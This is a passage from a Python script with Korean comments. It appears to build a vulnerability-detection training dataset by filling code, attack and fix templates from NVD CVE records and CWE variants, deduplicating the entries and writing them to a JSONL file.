                continue
            fill = dict(param=param, table=table, field=field, cls=cls, resource=resource)
            try:
                code   = tmpl_code.format(**fill)
                attack = tmpl_attack.format(**fill)
                fix    = tmpl_fix.format(**fill)
            except (KeyError, IndexError):
                continue

            cwe_id, cwe_name, severity = CWE_MAP[cwe]
            results.append(make_entry(tmpl_lang, code, cwe_id, cwe_name, severity, attack, fix))
            cve_tmpl_seen.add(key)

    return results


# ══════════════════════════════════════════════════════════════════════════════
# 3. 기존 50개 로드 + 중복 제거 후 합치기
# ══════════════════════════════════════════════════════════════════════════════

def load_existing() -> list[dict]:
    items = []
    if JSONL.exists():
        with open(JSONL, encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line:
                    items.append(json.loads(line))
    return items


def main():
    existing = load_existing()
    print(f"기존 데이터: {len(existing)}개")

    with open(NVD, encoding="utf-8") as f:
        nvd_data = json.load(f)
    print(f"NVD CVE 로드: {len(nvd_data)}개")

    nvd_examples = expand_nvd_templates(nvd_data, limit=150)
    print(f"NVD 템플릿 생성: {len(nvd_examples)}개")

    # 중복 제거 (전체 prompt 기준)
    seen: set[str] = set()
    all_data: list[dict] = []
    for item in existing + CWE_VARIANTS + nvd_examples:
        key = item["prompt"]
        if key not in seen:
            seen.add(key)
            all_data.append(item)

    random.shuffle(all_data)

    OUT.parent.mkdir(parents=True, exist_ok=True)
    with open(OUT, "w", encoding="utf-8") as f:
        for item in all_data:
            f.write(json.dumps(item, ensure_ascii=False) + "\n")

    print(f"\n총 학습 데이터: {len(all_data)}개 → {OUT}")

    # CWE 분포 출력
    from collections import Counter
    cwe_dist = Counter()
    for item in all_data:
        cwe = item["completion"].split()[0]
        cwe_dist[cwe] += 1
    print("\nCWE 분포:")
    for cwe, cnt in sorted(cwe_dist.items(), key=lambda x: -x[1]):
        print(f"  {cwe:12s}: {cnt:3d}개")


if __name__ == "__main__":
    main()
